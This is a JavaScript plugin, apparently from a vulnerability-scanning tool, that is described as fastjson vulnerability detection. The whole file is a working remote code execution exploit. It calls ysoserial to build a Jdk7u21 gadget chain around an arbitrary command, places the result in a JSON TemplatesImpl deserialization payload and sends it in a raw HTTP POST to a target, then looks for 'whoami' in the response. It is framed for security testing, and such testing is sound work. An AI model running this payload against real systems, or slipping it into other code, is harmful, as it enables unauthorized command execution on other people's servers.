module.exports={
	tags:"fastjson,web,",
    des:"fastjson,Vulnerability detection",
    dependencies:"java,ysoserial,base64,tr",
	VulApps:[],
	urls:["https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525"],
	doCheck:function (url,fnCbk,parms)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        
        try{
            var szPay1 = _s.child_process.execSync("java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 '" + _s.g_szCmd + "'|base64|tr -d \"\n\"").toString("utf-8");
            var len = 189 + szPay1.length,szPaload = `POST ${hst.pathname} HTTP/1.1
Host: ${hst.hostname}:${hst.port}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: ${len}

{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["${szPay1}"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}


`;
            _s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
            {
                var i = 0;
                s = String(s);
                var r = {"url":url,"send":szPaload};
                if(-1 < (i = s.indexOf("whoami")))
                {
                    r.vul = true;
                    fnCbk(r,_t);
                }
            });
        }catch(e){
            _s.error(e)}
	}
};